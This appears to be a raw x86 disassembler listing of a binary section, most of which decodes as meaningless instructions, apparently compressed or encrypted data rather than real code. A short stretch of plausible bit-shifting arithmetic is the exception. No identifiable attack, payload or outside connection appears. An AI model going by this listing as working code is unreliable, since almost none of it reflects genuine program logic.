  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi+0x6a083ae8],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	jle    0x406531
  406558:	iret   
  406559:	sub    BYTE PTR [ebx-0x61175115],bl
  40655f:	fst    QWORD PTR fs:[edi+0x1f]
  406563:	sbb    edx,eax
  406565:	aas    
  406566:	fiadd  WORD PTR [edx]
  406568:	int    0x13
  40656a:	pop    es
  40656b:	sub    esi,DWORD PTR [ecx-0x38]
  40656e:	add    eax,0xd1065da3
  406573:	mov    esi,ds
  406575:	and    eax,0xb73c7e15
  40657a:	mov    DWORD PTR [esi+eax*2-0x8],esi
  40657e:	out    0xc,al
  406580:	sahf   
  406581:	xor    al,0x46
  406583:	mov    edx,0xe9386623
  406588:	xchg   esi,eax
  406589:	or     ah,0xa0
  40658c:	adc    ch,BYTE PTR [eax-0x68ecca85]
  406592:	dec    eax
  406593:	aaa    
  406594:	std    
  406595:	int3   
  406596:	hlt    
  406597:	sti    
  406598:	loop   0x406614
  40659a:	and    bh,bh
  40659c:	sub    BYTE PTR [ebx+0x16],0xb1
  4065a0:	adc    BYTE PTR ds:0xd5a64fa1,0xcc
  4065a7:	into   
  4065a8:	imul   esi,DWORD PTR [edi-0x39],0x4083ecc8
  4065af:	jecxz  0x406615
  4065b1:	xor    BYTE PTR [ebx+0x1f],cl
  4065b4:	push   ds
  4065b5:	lods   al,BYTE PTR ds:[esi]
  4065b6:	inc    ebp
  4065b7:	xlat   BYTE PTR ds:[ebx]
  4065b8:	loope  0x406591
  4065ba:	inc    esi
  4065bb:	sub    dl,BYTE PTR [ebx]
  4065bd:	pop    edi
  4065be:	sahf   
  4065bf:	dec    edi
  4065c0:	add    WORD PTR [ecx-0x6e743a29],bp
  4065c7:	sub    DWORD PTR [esi-0x41ad4704],ebp
  4065cd:	scas   eax,DWORD PTR es:[edi]
  4065ce:	enter  0xf606,0x69
  4065d2:	lock enter 0x5ba9,0xc1
  4065d7:	pop    ebx
  4065d8:	addr16 add eax,0x57a33e2d
  4065de:	or     DWORD PTR [edx+0x77],edi
  4065e1:	mov    edi,0xca116630
  4065e6:	pop    esp
  4065e7:	lods   al,BYTE PTR ds:[esi]
  4065e8:	jge    0x406651
  4065ea:	cmp    dl,BYTE PTR [edi]
  4065ec:	push   ds
  4065ed:	fdivr  st(2),st
  4065ef:	outs   dx,BYTE PTR ds:[esi]
  4065f0:	or     eax,esi
  4065f2:	imul   esi,DWORD PTR [ebx-0x16],0xef0e533b
  4065f9:	mov    bh,0xbc
  4065fb:	cmc    
  4065fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065fd:	lods   eax,DWORD PTR ds:[esi]
  4065fe:	push   ebp
  4065ff:	enter  0x7d5b,0xf0
  406603:	je     0x4065a1
  406605:	push   es
  406606:	stos   BYTE PTR es:[edi],al
  406607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406608:	dec    ebx
  406609:	sbb    DWORD PTR [ebp+0x229dd8ab],esi
  40660f:	push   ebp
  406610:	clc    
  406611:	fcomp  QWORD PTR ds:[edx+0x3b]
  406615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406616:	loop   0x4065a4
  406618:	jo     0x406696
  40661a:	adc    eax,DWORD PTR [edi-0x22]
  40661d:	(bad)  
  40661f:	push   eax
  406620:	pop    eax
  406621:	xchg   BYTE PTR [ebx+0xa],al
  406624:	pop    esp
  406625:	jge    0x406629
  406627:	push   es
  406628:	mov    esi,0x16aa29cf
  40662d:	loop   0x406603
  40662f:	inc    eax
  406630:	push   es
  406631:	lahf   
  406632:	jmp    0x23bb007d
  406637:	inc    BYTE PTR [edx+0x5d8fdfb3]
  40663d:	(bad)  
  40663f:	call   0x8d8097b1
  406644:	cmp    eax,0x37f9fa31
  406649:	into   
  40664a:	xor    al,0xf8
  40664c:	pop    es
  40664d:	or     eax,0xfc0f1753
  406652:	mov    ebp,DWORD PTR [esi-0x51329779]
  406658:	push   es
  406659:	neg    BYTE PTR [ebx+0x24c7d3ce]
  40665f:	lds    ebp,FWORD PTR [ebp-0x28]
  406662:	adc    esi,esi
  406664:	inc    esi
  406665:	fwait
  406666:	ror    DWORD PTR [eax+0x59e71f93],cl
  40666c:	sub    eax,0xc711e4e8
  406671:	neg    DWORD PTR [eax+edi*8+0x7018df02]
  406678:	xchg   edi,eax
  406679:	sbb    DWORD PTR [ebx-0xc9e2795],eax
  40667f:	dec    esp
  406680:	jae    0x406656
  406682:	or     DWORD PTR [eax*4-0x57d64c86],eax
  406689:	xor    BYTE PTR [esp+ebp*1+0x7b495a0a],dh
  406690:	ja     0x406700
  406692:	mov    eax,0x62ab3324
  406697:	nop
  406698:	dec    esi
  406699:	dec    esp
  40669a:	imul   edx,DWORD PTR gs:[eax+0x74],0xffffffd0
  40669f:	inc    esi
  4066a0:	adc    eax,0x87fa7f2e
  4066a5:	arpl   WORD PTR [eax-0x8],si
  4066a8:	les    ebx,FWORD PTR cs:[eax]
  4066ab:	imul   ebp,DWORD PTR [edx+0x7b],0xda21ccfb
  4066b2:	jg     0x40667e
  4066b4:	test   al,0xc0
  4066b6:	xchg   esp,eax
  4066b7:	popf   
  4066b8:	and    al,0xa9
  4066ba:	push   ebx
  4066bb:	sub    BYTE PTR [edx],dh
  4066bd:	and    eax,0x8beb0813
  4066c2:	mov    eax,ds:0xd39ddd24
  4066c7:	std    
  4066c8:	mov    BYTE PTR [eax],bh
  4066ca:	cmova  eax,eax
  4066cd:	push   0x1be0d44a
  4066d2:	jae    0x406677
  4066d4:	int    0x48
  4066d6:	sub    DWORD PTR [edi-0xc],0xb8f60d7d
  4066dd:	cmp    ecx,ebx
  4066df:	repz or DWORD PTR [esi-0x67],ebp
  4066e3:	xchg   edi,eax
  4066e4:	imul   esp,DWORD PTR [edi-0x49bbe550],0x6e5f6c35
  4066ee:	pop    esi
  4066ef:	(bad)  
  4066f0:	dec    eax
  4066f1:	scas   al,BYTE PTR es:[edi]
  4066f2:	or     BYTE PTR [edi],bh
  4066f4:	nop
  4066f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f6:	sbb    BYTE PTR [eax-0x56],0xe9
  4066fa:	mov    ebp,0xc4200fff
  4066ff:	(bad)  
  406700:	or     BYTE PTR [esi-0x64],al
  406703:	jae    0x406752
  406705:	(bad)  
  406706:	retf   
  406707:	xor    edx,DWORD PTR ds:0xe8752b
  40670d:	ror    cl,1
  40670f:	(bad)  
  406710:	nop    DWORD PTR [ebx+0x60d39451]
  406717:	mov    al,0x3e
  406719:	sbb    BYTE PTR [ebx],0xa7
  40671c:	jge    0x4066ac
  40671e:	adc    ebp,edx
  406720:	aam    0xb2
  406722:	movntq (bad),mm3
  406723:	out    0xde,eax
  406725:	mov    ebx,0xf2cf76c4
  40672a:	xchg   ebp,eax
  40672b:	fld    st(6)
  40672d:	scas   eax,DWORD PTR es:[edi]
  40672e:	pop    es
  40672f:	and    DWORD PTR [eax+esi*1-0x65c55dbd],edi
  406736:	shr    DWORD PTR [esi+0x1e],1
  406739:	gs push ds
  40673b:	fistp  WORD PTR [edx+0x49]
  40673e:	inc    ecx
  40673f:	xchg   edi,eax
  406740:	jle    0x4067be
  406742:	mov    cl,0x88
  406744:	xchg   BYTE PTR [ebp-0x46faef5b],dh
  40674a:	add    eax,0x81a06a89
  40674f:	cwde   
  406750:	ins    BYTE PTR es:[edi],dx
  406751:	sbb    edi,DWORD PTR [edx-0x7c]
  406754:	push   ds
  406755:	mov    eax,ds:0xb88eafea
  40675a:	and    eax,DWORD PTR ds:0x217a36d4
  406760:	adc    ah,dh
  406762:	mov    dh,0x84
  406764:	repnz or BYTE PTR cs:[ebx+ebx*1-0x38],bh
  40676a:	mov    ch,0x23
  40676c:	pop    es
  40676d:	or     BYTE PTR [ebp+0x7a],bl
  406770:	mov    bh,0xe9
  406772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406773:	mov    ah,0xde
  406775:	adc    dl,BYTE PTR [edi+0x62]
  406778:	repz bnd call DWORD PTR cs:[eax]
  40677d:	xchg   DWORD PTR [edi],edi
  40677f:	xor    bh,bl
  406781:	aad    0xca
  406783:	jne    0x40672f
  406785:	ins    BYTE PTR es:[edi],dx
  406786:	push   0x1
  406788:	outs   dx,DWORD PTR ds:[esi]
  406789:	lods   eax,DWORD PTR ds:[esi]
  40678a:	push   ss
  40678b:	adc    eax,0xdfc59eca
  406790:	mov    ebx,0xcb9a9fff
  406795:	(bad)  
  406796:	stos   DWORD PTR es:[edi],eax
  406797:	popa   
  406798:	mov    dl,0x34
  40679a:	sub    al,0xa6
  40679c:	add    eax,0xc9da54ec
  4067a1:	dec    edi
  4067a2:	into   
  4067a3:	stos   DWORD PTR es:[edi],eax
  4067a4:	sbb    eax,ebx
  4067a6:	mov    gs,esp
  4067a8:	popa   
  4067a9:	stos   DWORD PTR es:[edi],eax
  4067aa:	and    BYTE PTR [edx],ah
  4067ac:	inc    edx
  4067ad:	neg    BYTE PTR [ebx+ecx*1]
  4067b0:	ss mov esi,0xd214b600
  4067b6:	add    DWORD PTR [ebx-0x183fd18f],esi
  4067bc:	cwde   
  4067bd:	iret   
  4067be:	sbb    al,0x44
  4067c0:	cmp    BYTE PTR [ebp+0x10459068],dh
  4067c6:	imul   ecx,DWORD PTR [esi],0xffffffa9
  4067c9:	mov    cl,0x1d
  4067cb:	jmp    0x58dcbc4e
  4067d0:	inc    ebx
  4067d1:	sub    eax,0x8d893abe
  4067d6:	pop    edx
  4067d7:	in     eax,dx
  4067d8:	mov    al,ds:0x3c78638b
  4067dd:	pop    ebx
  4067de:	push   ecx
  4067df:	mov    ds:0x91ea4427,eax
  4067e4:	add    ebp,DWORD PTR [edi]
  4067e6:	push   cs
  4067e7:	jo     0x4067dc
  4067e9:	inc    esp
  4067ea:	lods   eax,DWORD PTR ds:[esi]
  4067ec:	ds rol ch,1
  4067ef:	in     al,dx
  4067f0:	pop    edi
  4067f1:	pop    esp
  4067f2:	dec    ecx
  4067f3:	push   0x61
  4067f5:	inc    eax
  4067f6:	fidiv  WORD PTR [ecx+0x91772ee]
  4067fc:	ret    
  4067fd:	aam    0xe8
  4067ff:	cmp    eax,0x9828fd3b
  406804:	test   BYTE PTR [eax+0x2f5d6a07],cl
  40680a:	ror    DWORD PTR [eax+0x59],cl
  40680d:	rcl    BYTE PTR [edx-0x21d6203b],0x84
  406814:	xchg   esp,eax
  406815:	mov    al,0x25
  406817:	sub    al,0x6b
  406819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40681a:	xchg   ebp,eax
  40681b:	lahf   
  40681c:	push   ds
  40681d:	pop    esi
  40681e:	or     DWORD PTR [ebx+0x3389234c],ebx
  406824:	sar    edi,1
  406826:	or     DWORD PTR [esi],eax
  406828:	sbb    al,0xfb
  40682a:	int    0x44
  40682c:	pushf  
  40682d:	bswap  ecx
  40682f:	push   DWORD PTR [edi]
  406831:	jp     0x4067b3
  406833:	mov    esp,0x19294cea
  406838:	cld    
  406839:	inc    ebx
  40683a:	sub    eax,DWORD PTR [eax]
  40683c:	mov    bh,0xdd
  40683e:	repz (bad) 
  406840:	jle    0x40689a
  406842:	idiv   DWORD PTR [edx-0x44f4cd4a]
  406848:	stos   DWORD PTR es:[edi],eax
  406849:	inc    edx
  40684a:	stc    
  40684b:	or     al,0xc3
  40684d:	xchg   BYTE PTR [ebx-0x23],bl
  406850:	stc    
  406851:	aam    0xd2
  406853:	mov    al,ds:0xa2da685f
  406858:	push   esi
  406859:	enter  0xb3e0,0x9c
  40685d:	js     0x4068af
  40685f:	mov    ds:0x6cbda970,al
  406864:	(bad)
  406867:	mov    eax,0x2dabda5b
  40686c:	pop    es
  40686d:	fcomp  st(6)
  40686f:	retf   
  406870:	pop    edi
  406871:	cdq    
  406872:	push   esi
  406873:	std    
  406874:	cmp    DWORD PTR [ebx],esi
  406876:	push   es
  406877:	std    
  406878:	test   eax,0xd377f87e
  40687d:	sub    BYTE PTR [edx+0x5fe9c820],cl
  406883:	fimul  WORD PTR [edi+ebp*8]
  406886:	mov    bl,0xff
  406888:	inc    ecx
  406889:	iret   
  40688a:	rol    dh,1
  40688c:	popa   
  40688d:	aas    
  40688e:	inc    ebx
  40688f:	loopne 0x406900
  406891:	jge    0x4068d5
  406893:	pop    ebp
  406894:	inc    ecx
  406895:	(bad)  
  406896:	mov    eax,0x25f91bff
  40689b:	pop    ecx
  40689c:	mov    WORD PTR [esi+0x44dfce2],cs
  4068a2:	int    0xc9
  4068a4:	cmp    al,0x62
  4068a6:	mov    ebx,0x3d93c455
  4068ab:	daa    
  4068ac:	imul   edx,edi,0xffffffa8
  4068af:	stc    
  4068b0:	and    edi,DWORD PTR [edx+0x321aadfd]
  4068b6:	sub    ecx,DWORD PTR [esi+0x1b]
  4068b9:	pop    esi
  4068ba:	not    DWORD PTR [esi+0x39]
  4068bd:	pop    eax
  4068be:	sub    al,0xc5
  4068c0:	inc    esi
  4068c1:	pop    ds
  4068c2:	ss daa 
  4068c4:	stos   DWORD PTR es:[edi],eax
  4068c5:	out    0xdd,eax
  4068c7:	cli    
  4068c8:	cmc    
  4068c9:	dec    ebx
  4068ca:	pop    edx
  4068cb:	hlt    
  4068cc:	cmp    edi,esp
  4068ce:	mov    esi,0x422d2c40
  4068d3:	sbb    dl,BYTE PTR [eax]
  4068d5:	push   eax
  4068d6:	scas   eax,DWORD PTR es:[edi]
  4068d7:	pop    ecx
  4068d8:	sbb    edx,DWORD PTR [esi+edx*8+0x11]
  4068dc:	jmp    0xa3f29e21
  4068e1:	dec    ecx
  4068e2:	call   0xe7e026ef
  4068e7:	cmp    ebp,0x3d
  4068ea:	popf   
  4068eb:	push   ebp
  4068ec:	pop    edi
  4068ed:	popf   
  4068ee:	sub    eax,0xfaaf288d
  4068f3:	xor    edx,ecx
  4068f5:	out    0x7,al
  4068f7:	pop    ss
  4068f8:	xchg   esi,eax
  4068f9:	adc    BYTE PTR [esi],bl
  4068fb:	test   al,0x57
  4068fd:	mov    dl,BYTE PTR [edi+edi*8+0x61]
  406901:	outs   dx,DWORD PTR ds:[esi]
  406902:	and    BYTE PTR ds:0x6938182a,bh
  406908:	ins    BYTE PTR es:[edi],dx
  406909:	dec    edi
  40690a:	sub    al,0x76
  40690c:	fcmovnbe st,st(1)
  40690e:	data16 hlt 
  406910:	gs dec edx
  406912:	stc    
  406913:	(bad)  
  406915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406916:	jle    0x4068d9
  406918:	loope  0x406938
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xb07b5244
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	adc    dh,dh
  406982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406983:	das    
  406984:	mov    ds:0x362a2f,eax
  406989:	imul   edx,DWORD PTR [edi],0x73
  40698c:	mov    eax,0xd1efde3
  406991:	pushf  
  406992:	sub    DWORD PTR [esi],eax
  406994:	jmp    0x566a95df
  406999:	(bad)  
  40699a:	cmp    ebp,DWORD PTR [edi]
  40699c:	or     ebp,DWORD PTR [edx-0x12]
  40699f:	mov    eax,ds:0xd00ce571
  4069a4:	jg     0x4069d4
  4069a6:	push   ds
  4069a7:	inc    ebx
  4069a8:	add    al,BYTE PTR [ebx]
  4069aa:	in     eax,0xd1
  4069ac:	adc    bl,BYTE PTR [esi]
  4069ae:	ret    0xa2ee
  4069b1:	les    edi,FWORD PTR [eax]
  4069b3:	or     ebx,ebp
  4069b5:	mov    al,ds:0x74d51a84
  4069ba:	sar    BYTE PTR [edi+0x39e0666b],cl
  4069c0:	push   ebp
  4069c1:	aad    0x85
  4069c3:	fwait
  4069c4:	lea    edi,[ecx-0x40]
  4069c7:	std    
  4069c8:	ret    0xac58
  4069cb:	inc    DWORD PTR [ebp+esi*2+0x1e]
  4069cf:	scas   al,BYTE PTR es:[edi]
  4069d0:	stc    
  4069d1:	cld    
  4069d2:	lock enter 0xb948,0xa4
  4069d7:	dec    esp
  4069d8:	mov    WORD PTR [edx],?
  4069da:	aaa    
  4069db:	iret   
  4069dc:	(bad)  
  4069dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069de:	mov    esi,ebx
  4069e0:	adc    BYTE PTR [ecx],dh
  4069e2:	repnz mov ecx,0xbc2261e6
  4069e8:	sbb    esi,DWORD PTR [eax+0x25]
  4069eb:	pop    ds
  4069ec:	shr    BYTE PTR [edi],1
  4069ee:	js     0x406a0e
  4069f0:	jmp    0x5118:0x12e6145b
  4069f7:	outs   dx,DWORD PTR ds:[esi]
  4069f8:	inc    ebp
  4069f9:	push   edx
  4069fa:	push   ss
  4069fb:	sbb    eax,0x8ad9d18
  406a00:	inc    bp
  406a02:	dec    eax
  406a03:	loope  0x406a0c
  406a05:	and    DWORD PTR [eax],eax
  406a07:	pop    edx
  406a08:	mov    ds:0x44abd409,al
  406a0d:	sbb    BYTE PTR [ebp-0x5ad21f82],dh
  406a13:	dec    edx
  406a14:	lods   eax,DWORD PTR ds:[esi]
  406a15:	xor    ah,BYTE PTR [ecx+esi*2-0x4d]
  406a19:	xchg   ecx,eax
  406a1a:	cdq    
  406a1b:	or     eax,0xce0c9ef8
  406a20:	je     0x406a17
  406a22:	mov    edx,0x9276fa
  406a27:	push   esp
  406a28:	lds    esi,FWORD PTR [eax-0x526a32a3]
  406a2e:	test   DWORD PTR [eax],eax
  406a30:	in     al,0x5e
  406a32:	lahf   
  406a33:	hlt    
  406a34:	sbb    al,0xb0
  406a36:	sbb    ah,ch
  406a38:	push   es
  406a39:	add    esi,DWORD PTR [ebp-0x7f1e22de]
  406a3f:	adc    eax,0x3e103124
  406a44:	sbb    al,0x43
  406a46:	shl    BYTE PTR [ebp-0x26],0x80
  406a4a:	fadd   QWORD PTR [eax+0x3444291a]
  406a50:	loop   0x406a81
  406a52:	and    eax,0x22d2d2cc
  406a57:	push   ecx
  406a58:	pop    esp
  406a59:	lods   eax,DWORD PTR ds:[esi]
  406a5a:	mov    al,0x6d
  406a5c:	push   edx
  406a5d:	retf   0xc11f
  406a60:	pusha  
  406a61:	jo     0x406a51
  406a63:	dec    eax
  406a64:	rcr    DWORD PTR [edx],cl
  406a66:	sbb    DWORD PTR [esi-0x76e0dd12],0xffffff94
  406a6d:	inc    esp
  406a6e:	jl     0x406aeb
  406a70:	jcxz   0x406a26
  406a73:	inc    ebx
  406a74:	(bad)  [ecx+0x1c]
  406a77:	rol    BYTE PTR [eax+ebp*4],0xb2
  406a7b:	iret   
  406a7c:	test   DWORD PTR [ecx-0x2b],0xe54f3ef4
  406a83:	or     al,0xfc
  406a85:	lock and al,0x8a
  406a88:	call   0xe3b6:0xf62a9547
  406a8f:	push   ebx
  406a90:	mov    al,ds:0x5927494a
  406a95:	mov    ch,0x56
  406a97:	sbb    al,0x50
  406a99:	leave  
  406a9a:	push   ds
  406a9b:	icebp  
  406a9c:	fdivr  QWORD PTR [edx+0xb]
  406a9f:	adc    al,0x75
  406aa1:	out    dx,eax
  406aa2:	pusha  
  406aa3:	mov    BYTE PTR [edi-0x5f4e642],ch
  406aa9:	pusha  
  406aaa:	or     al,0xfc
  406aac:	fist   WORD PTR [ebp-0x59206b7b]
  406ab2:	mov    al,ds:0x659aae99
  406ab7:	pop    ebx
  406ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ab9:	pop    edx
  406aba:	push   esp
  406abb:	fdiv   st(3),st
  406abd:	pop    ebx
  406abe:	scas   al,BYTE PTR es:[edi]
  406abf:	test   al,dl
  406ac1:	fdivr  st(3),st
  406ac3:	push   0x6c208080
  406ac8:	popf   
  406ac9:	sahf   
  406aca:	mov    ah,0xd5
  406acc:	sti    
  406acd:	call   0x8b88:0x52d17516
  406ad4:	xor    edi,DWORD PTR [ebx]
  406ad6:	daa    
  406ad7:	or     BYTE PTR cs:[esi+0x73e4c582],0x37
  406adf:	dec    edx
  406ae0:	or     eax,0xb8967ab0
  406ae5:	lods   al,BYTE PTR ds:[esi]
  406ae6:	push   edx
  406ae7:	ret    0xd4b
  406aea:	jmp    0xc172:0x73346ca3
  406af1:	adc    DWORD PTR [edi],eax
  406af3:	stos   DWORD PTR es:[edi],eax
  406af4:	in     al,dx
  406af5:	sbb    esi,ebx
  406af7:	retf   0x806b
  406afa:	repnz fdiv DWORD PTR [edi-0x3e]
  406afe:	inc    edi
  406aff:	xchg   ecx,eax
  406b00:	mov    esi,DWORD PTR [eax+edi*1-0x6]
  406b04:	dec    esp
  406b05:	sub    DWORD PTR [esi+ecx*1-0x6b80f274],0x39041ea
  406b10:	sub    al,0xc7
  406b12:	inc    ebp
  406b13:	int3   
  406b14:	std    
  406b15:	imul   BYTE PTR [ecx+ecx*4-0x38]
  406b19:	(bad)  
  406b1a:	mov    eax,0x3e27fdf
  406b1f:	jb     0x406b0e
  406b21:	push   0xffffffa2
  406b23:	fld    DWORD PTR [ebp+0x29]
  406b26:	mov    ch,0x6b
  406b28:	call   0x5154:0xff6f62d3
  406b2f:	mov    eax,ds:0x49927fcb
  406b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b35:	pop    edx
  406b36:	lods   al,BYTE PTR ds:[esi]
  406b37:	rcr    BYTE PTR [edx],0xe3
  406b3a:	or     ebp,DWORD PTR [edi]
  406b3c:	push   0xa6281ae0
  406b41:	pop    ebx
  406b42:	outs   dx,DWORD PTR ds:[esi]
  406b43:	fmul   QWORD PTR [edi-0x7f]
  406b46:	mov    dl,0x74
  406b48:	xchg   edx,eax
  406b49:	dec    edi
  406b4a:	pop    ecx
  406b4b:	mov    ah,0x6d
  406b4d:	retf   0x153d
  406b50:	sbb    BYTE PTR [ecx*2+0x39533f0e],0x53
  406b58:	push   edi
  406b59:	pushf  
  406b5a:	fimul  WORD PTR [esi-0x2]
  406b5d:	int3   
  406b5e:	fist   WORD PTR [ecx+eiz*8-0x7d]
  406b62:	(bad)  
  406b63:	gs pop ebp
  406b65:	mov    eax,ds:0x216e80c7
  406b6a:	out    dx,eax
  406b6b:	dec    ebx
  406b6c:	mov    ch,0xc7
  406b6e:	in     eax,0xba
  406b70:	push   esp
  406b71:	jns    0x406b81
  406b73:	mov    al,ds:0x1aa5567e
  406b78:	call   0xa284e677
  406b7d:	ja     0x406b07
  406b7f:	ins    DWORD PTR es:[edi],dx
  406b80:	out    dx,eax
  406b81:	std    
  406b82:	dec    eax
  406b84:	ins    BYTE PTR es:[edi],dx
  406b85:	or     eax,0xef71a53b
  406b8a:	jle    0x406b68
  406b8c:	leave  
  406b8d:	push   cs
  406b8e:	mov    dl,0x6
  406b90:	out    dx,al
  406b91:	fs test eax,0x8e5efd3d
  406b97:	jo     0x406bf8
  406b99:	popa   
  406b9a:	or     DWORD PTR [edi+eiz*2],esp
  406b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9e:	dec    esi
  406b9f:	aaa    
  406ba0:	aas    
  406ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ba2:	dec    ecx
  406ba3:	sub    eax,0xadc7e4b2
  406ba8:	test   DWORD PTR [ebx],edx
  406baa:	push   ss
  406bab:	mov    esi,0x7628ca17
  406bb0:	in     eax,0xf1
  406bb2:	and    al,0xc3
  406bb4:	cmp    al,0x53
  406bb6:	sub    ah,dh
  406bb8:	mov    edi,ss
  406bba:	xchg   ecx,eax
  406bbb:	inc    edx
  406bbc:	lock push ebp
  406bbe:	int    0x13
  406bc0:	repz clc 
  406bc2:	and    eax,0xaf2ef05a
  406bc7:	inc    ebx
  406bc8:	arpl   ax,cx
  406bca:	jne    0x406bab
  406bcc:	mov    dl,0x14
  406bce:	xchg   ecx,eax
  406bcf:	push   esi
  406bd0:	dec    dx
  406bd2:	cmp    dh,cl
  406bd4:	cmp    eax,eax
  406bd6:	mov    ds:0x7c75daab,eax
  406bdb:	jecxz  0x406bb8
  406bdd:	cld    
  406bde:	aad    0x77
  406be0:	outs   dx,DWORD PTR ds:[esi]
  406be1:	call   ebx
  406be3:	fnstenv [ebx-0x3b]
  406be6:	sbb    dh,BYTE PTR [esi+0x18]
  406be9:	sar    DWORD PTR [ecx+0x160d5396],1
  406bef:	loop   0x406bea
  406bf1:	outs   dx,DWORD PTR ds:[esi]
  406bf2:	or     al,0x36
  406bf4:	je     0x406c63
  406bf6:	push   ds
  406bf7:	ins    BYTE PTR es:[edi],dx
  406bf8:	lahf   
  406bf9:	es cld 
  406bfb:	jmp    0xc20b015c
  406c00:	or     DWORD PTR [ebp-0xf987ed2],eax
  406c06:	jns    0x406c7f
  406c08:	jg     0x406b97
  406c0a:	or     eax,0x23d979bc
  406c0f:	fild   DWORD PTR [edx]
  406c11:	xchg   esp,eax
  406c12:	mov    cl,0x17
  406c14:	test   eax,0x31e1434b
  406c19:	sbb    ebp,DWORD PTR [ebp+0x441d486e]
  406c1f:	dec    edi
  406c20:	sub    BYTE PTR [ebx],bh
  406c22:	sbb    al,0x53
  406c24:	repz or edi,DWORD PTR [esi]
  406c27:	pop    eax
  406c28:	sub    dh,dh
  406c2a:	retf   0x5b75
  406c2d:	jo     0x406c15
  406c2f:	sbb    ebp,esp
  406c31:	and    BYTE PTR [ebx],ah
  406c33:	jl     0x406c19
  406c35:	xor    dl,dl
  406c37:	das    
  406c38:	stc    
  406c39:	fwait
  406c3a:	clc    
  406c3b:	inc    esp
  406c3c:	(bad)  
  406c3e:	push   ecx
  406c3f:	arpl   WORD PTR [ebp-0x495a4d52],sp
  406c45:	sbb    BYTE PTR [eax],ch
  406c47:	xor    eax,0x26b244c5
  406c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4d:	mov    al,0xe7
  406c4f:	imul   ebp,DWORD PTR [eax],0x4690ad38
  406c55:	imul   edx,esi,0xdd187edb
  406c5b:	lock jnp 0x406c36
  406c5e:	sub    DWORD PTR [edi],esi
  406c60:	jge    0x406c77
  406c62:	(bad)  
  406c63:	or     esp,edx
  406c65:	pop    esi
  406c66:	add    DWORD PTR [edx+0x2f],ebx
  406c69:	sbb    BYTE PTR ds:0x26748bf7,ch
  406c6f:	adc    eax,DWORD PTR [esi]
  406c71:	std    
  406c72:	and    eax,0xd778a8b1
  406c77:	scas   eax,DWORD PTR es:[edi]
  406c78:	pop    ss
  406c79:	les    eax,FWORD PTR [edi+edx*8+0x31]
  406c7d:	xlat   BYTE PTR ds:[ebx]
  406c7e:	push   0xe4ea77ce
  406c83:	mov    ebp,0x248535bd
  406c88:	cwde   
  406c89:	out    0xed,eax
  406c8b:	lock push 0xf9c13ed2
  406c91:	sbb    DWORD PTR [ecx+ecx*8+0x79e1f08d],esp
  406c98:	inc    ebx
  406c99:	mov    WORD PTR [eax-0x47],cs
  406c9c:	sub    ebx,DWORD PTR [edi+0x74]
  406c9f:	and    BYTE PTR [edx],dh
  406ca1:	test   BYTE PTR [esi+0x4e],dh
  406ca4:	xchg   ebx,eax
  406ca5:	push   ebx
  406ca6:	and    al,0x17
  406ca8:	push   ebx
  406ca9:	jmp    0x406c5c
  406cab:	jno    0x406c82
  406cad:	(bad)  
  406cae:	jne    0x406c41
  406cb0:	add    dl,BYTE PTR [ebx-0x68]
  406cb3:	pop    ebx
  406cb4:	and    bl,BYTE PTR [esi+0x1f]
  406cb7:	mov    edi,0xf48c47d
  406cbc:	jecxz  0x406ce4
  406cbe:	add    bl,BYTE PTR ds:0xddd5c617
  406cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cc5:	or     eax,0xb4797a6
  406cca:	add    eax,0x42bd2d10
  406ccf:	xchg   ebx,eax
  406cd0:	test   al,0xc
  406cd2:	jb     0x406cae
  406cd4:	jg     0x406d48
  406cd6:	cs ins BYTE PTR es:[edi],dx
  406cd8:	pop    edx
  406cd9:	adc    al,0x87
  406cdb:	xlat   BYTE PTR ds:[ebx]
  406cdc:	data16 mov cl,dh
  406cdf:	js     0x406d02
  406ce1:	cmp    DWORD PTR [edx],0x8bc5b58
  406ce7:	call   0xe2622fa0
  406cec:	iret   
  406ced:	mov    al,ds:0xed00e50d
  406cf2:	sbb    dh,BYTE PTR [eax]
